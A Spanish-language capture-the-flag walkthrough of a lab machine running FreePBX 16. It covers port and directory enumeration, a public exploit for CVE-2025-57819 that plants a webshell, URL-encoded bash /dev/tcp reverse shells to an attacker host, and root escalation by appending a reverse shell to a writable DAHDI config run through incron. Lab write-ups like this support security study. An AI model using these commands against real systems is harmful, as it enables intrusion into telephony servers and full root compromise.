## 1. Reconocimiento Inicial

Iniciamos la auditoría verificando la conectividad con la máquina objetivo mediante una traza ICMP (`ping`), confirmando que el equipo está activo. A continuación, realizamos un escaneo de puertos y servicios utilizando `nmap`.

```Bash
nmap -sC -sV -O 10.129.48.114
```

**Servicios Identificados:**

|**PUERTO**|**SERVICIO**|**VERSIÓN**|
|---|---|---|
|22/tcp|ssh|OpenSSH 7.4 (protocol 2.0)|
|80/tcp|http|Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)|
|443/tcp|ssl/http|Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)|

Al intentar acceder al puerto 80 a través del navegador, observamos que el servidor nos redirige automáticamente al dominio `connected.htb`. Para que nuestro sistema pueda resolver este dominio, lo añadimos a nuestro archivo de resolución local:

![[Connected-p80.png]]

```Bash
echo "10.129.48.114 connected.htb" | sudo tee -a /etc/hosts
```

Una vez configurado, logramos visualizar la interfaz web del servidor:

## 2. Enumeración Web y Fuzzing

Para descubrir la estructura interna de la aplicación web, lanzamos un ataque de fuerza bruta sobre los directorios utilizando `gobuster`, tanto en la raíz como en el directorio `/admin/`.

```Bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://connected.htb -t 200
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://connected.htb/admin/ -t 200 -x txt,html,php -b 403,404
```

**Resultados:**

- `/admin/config.php` (Status: 200)
- `/admin/modules/` (Status: 301)
- `/admin/assets/` (Status: 301)
- `/admin/api/` (Status: 301)

### 2.1. Perfilado Tecnológico (WhatWeb)

Para obtener detalles específicos sobre las tecnologías desplegadas, utilizamos `whatweb`:

```Bash
whatweb http://connected.htb/
```

La salida de los escaneos y la cabecera de la web nos revelan que nos enfrentamos a una instancia de **FreePBX versión 16.0.40.7**.

## 3. Explotación (RCE en FreePBX)

Buscamos vulnerabilidades conocidas para esta plataforma utilizando `searchsploit` y bases de datos de vulnerabilidades:

```Bash
searchsploit freepbx
```

_Resultado:_ Identificamos que la versión 16 de FreePBX es vulnerable a una Ejecución Remota de Código (RCE) autenticada, asociada al identificador `CVE-2025-57819` (o equivalente en `searchsploit` como `52031.php`).

### 3.1. Ejecución del Exploit

Clonamos el repositorio del exploit público de _watchTowr_ y lo lanzamos contra nuestro objetivo:

```Bash
git clone https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819.git
cd watchTowr-vs-FreePBX-CVE-2025-57819
python3 cve-2025-57819.py -H http://connected.htb/
```

El script explota la vulnerabilidad con éxito y nos proporciona una URL que actúa como _webshell_:

`[http://connected.htb/this-is-an-ioc-not-actually-watchTowr-9ym7x1lttx.php?cmd=whoami](http://connected.htb/this-is-an-ioc-not-actually-watchTowr-9ym7x1lttx.php?cmd=whoami)`

### 3.2. Obtención de la Reverse Shell y Evasión de Bad Chars

Para establecer una conexión interactiva (_Reverse Shell_), preparamos un _listener_ en nuestra máquina atacante:

```Bash
nc -lvnp 4444
```

Dado que interactuamos con la _webshell_ mediante una petición HTTP GET (`?cmd=`), debemos inyectar nuestro _payload_ teniendo cuidado con los caracteres especiales.

El carácter `&` dentro del parámetro `cmd` es interpretado por el navegador y el servidor web como un delimitador de parámetros (query string), cortando el payload y descartando el resto de la inyección. Para evitar que la URL se fragmente y el comando llegue intacto al intérprete de bash subyacente, realizamos un **URL Encoding** del _payload_:

- `&` -> `%26`
- `>` -> `%3E`
- `/` -> `%2F`
- (espacio) -> `%20`

**Payload inyectado en el navegador:**

```Bash
http://connected.htb/this-is-an-ioc-not-actually-watchTowr-9ym7x1lttx.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<IP_ATACANTE>%2F4444%200%3E%261%27
```

Recibimos la conexión y obtenemos acceso inicial al sistema como el usuario `asterisk`. Leemos la primera bandera:

```Bash
cat /home/asterisk/user.txt
# 9d577ea70ac76f0812292b2b0b77273b
```

## 4. Escalada de Privilegios

Iniciamos la enumeración local buscando tareas programadas, binarios SUID y configuraciones erróneas.

### 4.1. Análisis de Tareas de Incron

Inspeccionamos la configuración de `incron` (un demonio similar a cron, pero basado en eventos del sistema de archivos inotify):

```Bash
cat /etc/incron.d/*
```

**Salida:**

```Bash
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

Esta regla (watcher) indica que, cada vez que el archivo `/var/spool/asterisk/sysadmin/dahdi_restart` es cerrado tras una operación de escritura (`IN_CLOSE_WRITE`), el sistema ejecuta automáticamente el binario `/usr/sbin/sysadmin_dahdi_restart` **en el contexto del usuario root**.

### 4.2. Secuestro de la Rutina DAHDI

Verificamos los permisos sobre los archivos de configuración asociados a DAHDI (la interfaz de hardware de telefonía para Asterisk) para comprobar si podemos inyectar código en la rutina de reinicio:

```Bash
find /etc/dahdi -name "*.conf" -writable
# ls -la /etc/dahdi/init.conf
```

Confirmamos que el archivo `/etc/dahdi/init.conf` es editable por nuestro usuario actual (`asterisk`). Sabiendo que este script de inicialización será invocado por el proceso de reinicio (`sysadmin_dahdi_restart`), procedemos a inyectar una _Reverse Shell_ al final del documento:

```Bash
echo "bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/4545 0>&1'" >> /etc/dahdi/init.conf
```

### 4.3. Detonación y Acceso Root

Preparamos un nuevo _listener_ en nuestra máquina atacante:

```Bash
nc -lvnp 4545
```

A continuación, forzamos el evento `IN_CLOSE_WRITE` en el archivo monitorizado por `incron` escribiendo un valor arbitrario en él:

```Bash
echo "Restart" >> /var/spool/asterisk/sysadmin/dahdi_restart
```

La escritura activa inmediatamente el watcher de `incron`, que lanza `/usr/sbin/sysadmin_dahdi_restart` como `root`. Éste, a su vez, lee y ejecuta nuestro archivo `/etc/dahdi/init.conf` envenenado.

Recibimos la conexión con privilegios máximos:

```Bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

